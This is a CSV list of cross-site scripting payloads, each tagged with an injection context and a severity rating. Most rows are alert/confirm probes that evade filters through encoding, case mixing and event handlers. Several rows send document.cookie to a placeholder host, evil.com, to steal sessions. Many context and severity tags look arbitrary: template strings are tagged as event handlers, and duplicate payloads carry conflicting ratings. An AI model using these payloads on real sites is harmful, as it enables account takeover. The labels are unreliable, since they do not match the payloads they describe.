payload,context,severity
<video src=x onerror=alert(1)>,event_handler,high
""" onerror=\u0061\u006cert(1) x=""",attribute,medium
"location=""javascript:alert(1)""",dom_sink,medium
""" onload=alert(1) x=""",attribute,medium
\x3cscript\x3ealert(document.domain)\x3c/script\x3e,script_injection,high
<script>confirm(1)</script>,script_injection,high
"document.body.innerHTML=""<img src=x onerror=confirm(1)>""",dom_sink,low
"<object data=""javascript:alert(1)"">",attribute_escape,high
"setTimeout(""alert(1)"",0)",dom_sink,medium
<svg onload=alert()>,html_body,medium
<video src=x onerror=confirm(1)>,event_handler,low
<scRIPt>d.innErHTML+='';</sCRipt>,html_body,high
"data:text/html,<script>alert(1)</script>",js_uri,medium
"onerror=""alert(1)""",html_body,medium
"<iframe src
=""javascript:alert(	1)"">",script_injection,low
#javascript:alert(document.cookie);,url,medium
"javascript:void(document.location=""http://evil.com"")",js_uri,low
<svg/src=x onerror=alert(1)//>,event_handler,low
"<SCRIPT>document.location=""http://evil.com/?c=""+document.cookie</SCRIPT>",script_injection,high
<video src=x onerror=alert(1)>,event_handler,medium
"sEtTiMeOuT(""aLeRt(1)"",0)",event_handler,medium
<svg/onload=confirm(1)>,template_injection,medium
${alert(1)},template_injection,medium
' onerror=alert(1) x=',attribute_escape,medium
<%= confirm(1) %>,js_uri,medium
"{{constructor.constructor(""al'+'ert(1)"")()}}",js_uri,low
<marquee onstart=alert(1)>,event_handler,high
"<iframe src=""javascript:confirm(1)"">",tag_injection,high
<iframe/onload=alert(0);>,attribute,medium
\' onerror=alert(1)//,attribute_escape,medium
<details open ontoggle=alert(1)>,event_handler,low
alert(document.cookie),attribute,medium
\' onerror=alert(1)//,attribute_escape,low
"<iframe src=""javascript:alert(1)"">",event_handler,medium
"setTimeout(""alert(1)"",0)",attribute_escape,medium
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",script_injection,low
' onmouseover=alert(1) ',attribute,high
"<embed src=""j\u0061v\u0061script:\u0061\u006cert(1)"">",script_injection,medium
javascript:alert(1),js_uri,low
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",attribute_escape,medium
&quot; onerror=confirm(1) x=&quot;,attribute_escape,high
<marquee onstart=alert(1)>,attribute_escape,high
"%3Ciframe src=""javascript:alert(1)""%3E",tag_injection,high
"<video src
=x onerror
=alert(	1)>",tag_injection,medium
"\""><img src=x onerror=alert(1)>",template_injection,high
{{7*7}},event_handler,high
"\""><img src=x onload=alert(1)>",attribute_escape,medium
&quot; onerror=al'+'ert(1) x=&quot;,template_injection,medium
"<embed src=""javascript:alert(1)"">",tag_injection,high
<svg ONLoaD=ALeRt()>,attribute,medium
javascript:confirm(1),js_uri,medium
#{alert(1)},script_injection,medium
javascript:alert(document.domain),js_uri,high
javascript:alert(document.domain),attribute_escape,high
"<object data=""javascript:alert(1)"">",tag_injection,medium
<input onfocus=alert(1) autofocus>,event_handler,high
<input onfocus=alert(1) autofocus>,event_handler,medium
